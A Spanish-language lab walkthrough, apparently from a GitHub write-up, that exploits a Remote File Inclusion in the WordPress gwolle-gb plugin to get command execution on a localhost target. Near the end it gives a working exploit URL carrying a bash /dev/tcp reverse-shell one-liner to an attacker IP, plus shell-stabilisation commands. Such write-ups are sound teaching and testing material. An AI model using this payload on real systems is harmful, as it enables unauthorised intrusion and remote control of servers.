> Podemos fuzzear para encontrar plugins vulnerables, tambien se podría usar wpscan

<img width="961" height="511" alt="image" src="https://github.com/user-attachments/assets/e3fac1c3-952d-4daf-8910-0c1a5702aae0" /><br>

> Podemos buscar por el nombre del plugin si es vulnerable mediante searchploit

<img width="775" height="138" alt="image" src="https://github.com/user-attachments/assets/19f8e6ad-8976-4908-8df6-90aa5c2eefe4" /><br>

> Vemos en que consiste y que parámetros habría que usar en la URL para aprovecharse de la vulnerabilidad

<img width="866" height="89" alt="image" src="https://github.com/user-attachments/assets/f006fc45-be5b-455c-a810-6414445c57b1" /><br>

> Nos montamos un servidor http mediante python por el puerto 80

<img width="694" height="113" alt="image" src="https://github.com/user-attachments/assets/c2855fb8-d4a2-4712-af38-33079fa91834" /><br>

> Cargamos la URL vulnerable

<img width="949" height="84" alt="image" src="https://github.com/user-attachments/assets/89d9308e-1e54-43c2-bea3-3dd83de85b67" /><br>

> Vemos que se intenta cargar un archivo wp-load.php desde nuestro servidor python, pero al no existir de nuestro lado devuelve un error 404

<img width="878" height="138" alt="image" src="https://github.com/user-attachments/assets/d24177db-d443-4c48-9671-d79d84957226" /><br>

> Si creamos ese archivo de nuestro lado aunque no tenga contenido

<img width="693" height="74" alt="image" src="https://github.com/user-attachments/assets/de53c96a-0a1a-4dd9-ac2a-dbee9d0cd0ea" /><br>

> Vemos que ahora devuelve un código de estado 200, por lo que lo carga correctamente 

<img width="876" height="164" alt="image" src="https://github.com/user-attachments/assets/fcbb4fbb-2967-422a-9f63-2dc4b11290c8" /><br>

> Ahora podemos probar añadiendo contenido, por ejemplo un código que nos permita ejecutar comandos desde la propia URL

<img width="769" height="189" alt="image" src="https://github.com/user-attachments/assets/6ab64d3c-19c7-406a-8782-b3baa2cbef9e" /><br>

> Si cargamos la URL añadiendole un comando

<img width="1160" height="59" alt="image" src="https://github.com/user-attachments/assets/1683814a-863f-40ac-9249-4882221fb015" /><br>

> Podemos ver que hemos explotado un Remote Command Execution (RCE) a partir de un Remote File Inclusion (RFI) previo

<img width="1589" height="277" alt="image" src="https://github.com/user-attachments/assets/ad942422-751c-4e21-a239-ff628901bc2c" /><br>

> Además podemos conseguir una revere-shell de esta manera

> Nos ponemos en escucha mediante netcat por el puerto deseado

<img width="673" height="99" alt="image" src="https://github.com/user-attachments/assets/50666d4f-15ab-4752-a7bf-a887bae331b9" /><br>

> Usamos un one-liner de bash que tendrá que estar en formato URL

```
http://localhost:31337/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://192.168.1.12/&cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.12/443 0>%261"
```
```
[ bash -i >%26 /dev/tcp/192.168.1.12/443 0>%261 ] =same-command= [ bash -i >& /dev/tcp/192.168.1.12/3333 0>&1 ]
```

> Si recargamos tal URL vemos que hemos recibido una conexion a nuestro netcat

<img width="1087" height="169" alt="image" src="https://github.com/user-attachments/assets/13eb02eb-0054-4328-a687-1412d0741a1d" /><br>

> Por estética podemos adaptar la conexion recibida

```
script /dev/null -c bash
Ctrl + Z
stty raw -echo; fg
reset xterm
stty rows 44 columns 144
export TERM=xterm
```

> Y vemos que podemos usar la rev.shell de manera correcta

<img width="947" height="117" alt="image" src="https://github.com/user-attachments/assets/e9446cce-f4c1-4775-ae37-291056aa560d" /><br>

